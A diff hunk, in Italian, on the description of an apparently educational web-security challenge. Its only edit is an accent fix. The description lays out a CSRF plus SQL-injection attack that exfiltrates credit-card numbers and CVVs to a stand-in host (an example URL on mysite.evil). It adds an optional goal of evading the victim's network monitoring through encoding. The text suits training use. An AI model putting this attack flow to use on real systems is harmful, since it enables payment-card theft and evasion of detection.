@@ -14,7 +14,7 @@ Ecco il flusso logico dettagliato dell\'attacco.<br/>
 4. Questo link sfrutta sia la vulnerabilità CSRF che quella di SQL injection sulla rete very-secure-intranet.local<br/>
 5. Il sito very-secure-intranet.local ritorna la pagina HTML in cui sono inseriti il numero di carta di credito e il numero cvv come oggetti speciali, avendo cura di inserire in questi oggetti i riferimenti al tuo sito. per esempio così:<br/>
 http://www.mysite.evil/log.php?cc_number=1111222233334444&cvv=423<br/>
-Il formato è un esempio, puoi usare qualsiasi cosa dopo http://www.mysite.evil/ (è fisso perchè rende più semplice il test della sfida :) ), ma deve contenere il numero di carta di credito e il codice cvv. Dovresti essere in grado di ricevere sul tuo sito tutte le informazioni salvate nella tabella delle carte di credito (e non solo pezzi di esse).<br/> 
+Il formato è un esempio, puoi usare qualsiasi cosa dopo http://www.mysite.evil/ (è fisso perché rende più semplice il test della sfida :) ), ma deve contenere il numero di carta di credito e il codice cvv. Dovresti essere in grado di ricevere sul tuo sito tutte le informazioni salvate nella tabella delle carte di credito (e non solo pezzi di esse).<br/> 
 <br/>
 Obiettivo opzionale: La rete dela vittima è auto-monitorata e un allarme è generato se c\'è un numero di carta di credito inviato in chiaro sulla rete. Il tuo obiettivo aggiuntivo è quello di evitare questo controllo utilizzando un qualsiasi tipo di codifica/crittazione.<br/>
 <br/>
